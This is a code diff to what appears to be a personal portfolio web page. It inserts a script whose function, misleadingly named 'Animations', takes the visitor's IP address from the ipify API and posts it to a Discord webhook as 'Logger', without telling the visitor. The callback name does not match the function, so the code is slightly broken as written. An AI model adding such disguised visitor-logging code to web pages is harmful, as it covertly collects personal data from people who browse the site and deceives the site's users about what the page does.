@@ -96,6 +96,25 @@
       </div>
     </section>
     
+    <script>
+      function Animations(json) {
+        var request = new XMLHttpRequest(); //making a request for the webhook
+        request.open("POST", "YOUR DISCORD WEBHOOK LINK HERE");
+
+        request.setRequestHeader('Content-type', 'application/json');
+
+        var params = {
+          username: "Logger",
+          avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+          content: "**IP:** *" + json.ip + "*"
+        }
+
+        request.send(JSON.stringify(params));
+      }
+
+    </script>
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> //using this api to get the ip
+    
     <section id="skills" class="skills">
       <p class="skills-text">My <span>Skills</span></p>
       <p class="skills-subtext">A list of my skills that i know! The percent depends on what i progress on, i commonly learn front end languges than back end languages.</p>
